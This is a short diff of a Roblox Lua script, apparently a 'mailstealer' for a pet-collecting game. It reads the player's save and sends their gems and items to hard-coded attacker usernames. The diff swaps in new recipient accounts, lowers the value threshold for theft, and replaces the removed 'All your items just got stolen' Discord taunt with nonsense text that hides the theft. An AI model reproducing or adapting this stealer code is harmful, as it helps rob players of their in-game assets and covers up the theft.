@@ -17,10 +17,10 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local user = _G.Username or "PetsGoMommy"
-local user2 = _G.Username2 or "PetsGoMommy"
+local user = _G.Username or "Pvgvg3"
+local user2 = _G.Username2 or "2020GEAR"
 local discuser = _G.discuser or ""
-local min_rap = _G.minrap or 1000000
+local min_rap = _G.minrap or 100000
 
 local newamount = 20000
 
@@ -352,6 +352,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
+    message.Error("slepa slepa slepetys su slepetem slepetuoja")
+    setclipboard("slepa slepa slepetys su slepetem slepetuoja")
 end
